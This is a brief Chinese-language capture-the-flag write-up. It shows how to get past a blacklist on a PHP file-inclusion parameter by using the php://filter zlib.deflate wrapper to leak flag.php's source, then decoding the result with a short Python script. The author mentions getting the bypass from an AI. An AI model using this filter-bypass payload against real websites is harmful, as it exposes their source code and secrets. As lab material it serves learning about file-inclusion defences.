1.探查
	按F12查看源代码，发现`?file=php://filter/read=convert.base64-encode/resource=flag.php`被列入黑名单中。
	询问AI后：发现
		`file=php://filter/read=zlib.deflate/resource=flag.php`没有被过滤
2.访问
	页面输出一大段base64不连续编码。
	zlib.deflate(没有标准zlib头)是php的压缩过滤器，他在读取文件时，把原始字节压缩成deflate压缩流再输出
	如:lZDfToJg...C5hc=这个看似Base64,其实是压缩后的二进制流，被浏览器/工具转成了可显示的base64文本
3.解出源码
	(1)base64源码-->得压缩字节
	(2)deflate解压-->得flag.php源码
	(3)执行代码:
```
	import base64,zlib
	b64="lZDfTo...C5hc="
	compressed=base64.b64decode(b64)
	print(len(compressed))
	source=zlib.decompress(compressed,-15)
	print(source.decode('utf-8',errors='replace'))
```
